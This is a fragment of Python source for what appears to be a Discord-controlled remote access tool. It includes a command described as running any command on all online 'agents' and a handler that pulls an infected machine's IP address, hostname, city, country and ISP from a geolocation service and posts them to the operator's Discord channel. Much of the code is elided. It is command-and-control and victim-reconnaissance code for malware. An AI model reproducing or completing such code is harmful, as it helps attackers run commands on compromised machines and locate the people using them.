...
@bot.hybrid_command(name="cmd-all", with_app_command=True, description="Run any command on all online agents")
@app_commands.guilds(GUILD)
...
async def location(ctx: commands.Context):
    if int(CURRENT_AGENT) == int(ID):
        ...
        if response:
            ...
            data = response.json()
            my_embed.add_field(name="IP:", value=f"**{data.get('YourFuckingIPAddress', '')}**", inline=False)
            my_embed.add_field(name="Hostname:", value=f"**{data.get('YourFuckingHostname', '')}**", inline=False)
            my_embed.add_field(name="City:", value=f"**{data.get('YourFuckingLocation', '')}**", inline=False)
            my_embed.add_field(name="Country:", value=f"**{data.get('YourFuckingCountryCode', '')}**", inline=False)
            my_embed.add_field(name="ISP:", value=f"**{data.get('YourFuckingISP', '')}**", inline=False)
        else:
